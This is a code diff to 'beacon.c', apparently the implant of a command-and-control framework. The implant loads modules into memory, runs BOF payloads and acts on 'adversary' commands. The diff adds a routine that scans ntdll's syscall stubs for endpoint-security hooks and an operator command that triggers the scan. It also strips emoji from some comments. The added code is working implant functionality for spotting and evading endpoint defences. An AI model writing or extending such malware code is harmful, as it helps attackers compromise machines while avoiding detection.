@@ -209,6 +209,7 @@ cat > beacon.c << EOF
 #include <shellapi.h>
 #include <winioctl.h>
 #include <setjmp.h>
+#include <psapi.h>
 
 #include "aes.h"
 #include "cJSON.h"
@@ -887,7 +888,7 @@ BOOL ExecuteModule(PVOID moduleBase) {
 
     PVOID entryPoint = (BYTE*)moduleBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
 
-    // ✅ Ejecutar TLS callbacks antes de cualquier cosa
+    // Ejecutar TLS callbacks antes de cualquier cosa
     ExecuteTLSCallbacks(moduleBase);
 
     // === CASO 1: Tiene DllMain (DLL normal) ===
@@ -895,7 +896,7 @@ BOOL ExecuteModule(PVOID moduleBase) {
         typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
         DllMain_t DllMain = (DllMain_t)entryPoint;
 
-        // 🔁 Primero: intentar DllMain
+        // Primero: intentar DllMain
         if (DllMain((HINSTANCE)moduleBase, DLL_PROCESS_ATTACH, NULL)) {
             printf("[+] DllMain ejecutado exitosamente\n");
             fflush(stdout);
@@ -1303,7 +1304,7 @@ BOOL load_lazyconf() {
         }
 
         response[totalSize] = '\0';
-        printf("[+] ✅ Config descargada (%lu bytes): %.200s\n", totalSize, response);
+        printf("[+] Config descargada (%lu bytes): %.200s\n", totalSize, response);
 
         // PARSEAR JSON
         cJSON *root = cJSON_Parse(response);
@@ -4902,12 +4903,78 @@ void go(unsigned char * bof_data, int bof_size, char * args, int args_len) {
     BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Ejecutando con argumento: '%.*s' (len=%d)", 
                 args_len, args, args_len);
     
-    // ✅ Ya NO necesitamos alineación manual aquí - RunCOFF se encarga
+    // Ya NO necesitamos alineación manual aquí - RunCOFF se encarga
     int result = RunCOFF("go", bof_data, bof_size, (unsigned char*)args, args_len);
     
     BeaconPrintf(CALLBACK_OUTPUT, "[BOF] RunCOFF result = %d", result);
 }
 
+int hooked()
+{
+    PDWORD functionAddress = (PDWORD)0;
+    
+    // Get ntdll base address
+    HMODULE libraryBase = LoadLibraryA("ntdll");
+    if (!libraryBase) {
+        printf("Failed to load ntdll.dll\n");
+        return 1;
+    }
+
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
+    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);
+
+    // Locate export address table
+    DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);
+
+    // Offsets to list of exported functions and their names
+    PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
+    PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
+    PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);
+
+    // Iterate through exported functions of ntdll
+    for (DWORD i = 0; i < imageExportDirectory->NumberOfNames; i++)
+    {
+        // Resolve exported function name
+        DWORD functionNameRVA = addressOfNamesRVA[i];
+        DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
+        char* functionName = (char*)functionNameVA;
+        
+        // Resolve exported function address
+        DWORD_PTR functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
+        functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
+
+        // Syscall stubs start with these bytes
+        unsigned char syscallPrologue[4] = { 0x4c, 0x8b, 0xd1, 0xb8 };
+
+        // Only interested in Nt|Zw functions
+        if ((strncmp(functionName, "Nt", 2) == 0 || strncmp(functionName, "Zw", 2) == 0))
+        {
+            // Check if the first 4 bytes of the exported function match the syscall prologue
+            if (memcmp(functionAddress, syscallPrologue, 4) != 0) 
+            {
+                if (*((unsigned char*)functionAddress) == 0xE9) // first byte is a jmp instruction
+                {
+                    DWORD jumpTargetRelative = *((PDWORD)((char*)functionAddress + 1));
+                    PDWORD jumpTarget = (PDWORD)((char*)functionAddress + 5 + jumpTargetRelative);  
+                    char moduleNameBuffer[512] = {0};
+                    if (GetMappedFileNameA(GetCurrentProcess(), jumpTarget, moduleNameBuffer, sizeof(moduleNameBuffer))) {
+                        printf("Hooked: %s : %p into module %s\n", functionName, functionAddress, moduleNameBuffer);
+                    } else {
+                        printf("Hooked: %s : %p (failed to resolve target module)\n", functionName, functionAddress);
+                    }
+                }
+                else
+                {
+                    printf("Potentially hooked: %s : %p\n", functionName, functionAddress);
+                }
+            }
+        }
+    }
+
+    FreeLibrary(libraryBase);
+    return 0;
+}
 // Función principal de manejo de comandos
 void handleAdversary(char* command) {
     printf("[*] Handling adversary command: %s\n", command);
@@ -5300,6 +5367,12 @@ void handleAdversary(char* command) {
 
         go(bof_data, bof_size, args, args ? strlen(args) : 0);
         free(bof_data);
+        goto send_response;
+    }
+
+    if (strncmp(command, "hook:", 5) == 0) {
+        hooked();
+        snprintf(output, sizeof(output), "get syscalls hooked");
         goto send_response;
     }
 
